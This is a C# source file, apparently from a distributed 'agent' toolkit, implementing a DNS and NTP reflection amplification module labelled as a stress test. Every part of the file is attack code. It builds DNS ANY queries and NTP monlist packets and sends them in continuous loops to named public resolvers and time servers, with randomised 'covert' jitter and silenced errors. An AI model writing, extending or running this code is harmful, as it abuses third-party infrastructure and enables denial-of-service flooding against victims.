using System.Net.Sockets;
using System.Text;
using LibraNextgen.Common.Models;

namespace LibraNextgen.Agent.Modules.StressTest;

public class ReflectionAmp : IStressMethod
{
    public string Name => "Reflection Amplification (DNS/NTP)";

    private static readonly string[] DnsResolvers =
        ["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9", "208.67.222.222", "208.67.220.220", "4.2.2.4"];

    private static readonly string[] NtpServers =
        ["time.google.com", "pool.ntp.org", "time.windows.com", "time.nist.gov", "ntp.aliyun.com"];

    public async Task ExecuteAsync(StressConfig config, IStressReporter rpt, CancellationToken ct)
    {
        var tasks = new List<Task>();
        var threads = Math.Min(config.ThreadsPerAgent / 5, 50);
        for (int i = 0; i < threads; i++)
            tasks.Add(i % 2 == 0 ? DnsLoop(config, rpt, ct) : NtpLoop(config, rpt, ct));
        await Task.WhenAll(tasks);
    }

    private async Task DnsLoop(StressConfig config, IStressReporter rpt, CancellationToken ct)
    {
        using var client = new UdpClient();
        while (!ct.IsCancellationRequested)
        {
            try
            {
                var q = BuildDnsAny(Guid.NewGuid().ToString("N")[..8] + ".com");
                var resolver = DnsResolvers[Random.Shared.Next(DnsResolvers.Length)];
                await client.SendAsync(q, resolver, 53, ct);
                rpt.IncrementPackets();
                rpt.IncrementBytes(q.Length + 512); // estimate amplified response
                await Task.Delay(CovertUtils.RandomJitter(50, 0.5), ct);
            }
            catch { }
        }
    }

    private async Task NtpLoop(StressConfig config, IStressReporter rpt, CancellationToken ct)
    {
        using var client = new UdpClient();
        while (!ct.IsCancellationRequested)
        {
            try
            {
                var server = NtpServers[Random.Shared.Next(NtpServers.Length)];
                await client.SendAsync(BuildNtpMonlist(), server, 123, ct);
                rpt.IncrementPackets();
                rpt.IncrementBytes(48 + 482); // request + estimated monlist response
                await Task.Delay(CovertUtils.RandomJitter(100, 0.5), ct);
            }
            catch { }
        }
    }

    private static byte[] BuildDnsAny(string domain)
    {
        using var ms = new MemoryStream();
        ms.Write([0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
        foreach (var part in domain.Split('.'))
        {
            if (string.IsNullOrEmpty(part)) continue;
            ms.WriteByte((byte)part.Length);
            ms.Write(Encoding.ASCII.GetBytes(part));
        }
        ms.WriteByte(0);
        ms.Write([0x00, 0xFF, 0x00, 0x01]);
        return ms.ToArray();
    }

    private static byte[] BuildNtpMonlist()
    {
        return [0x16, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
    }
}
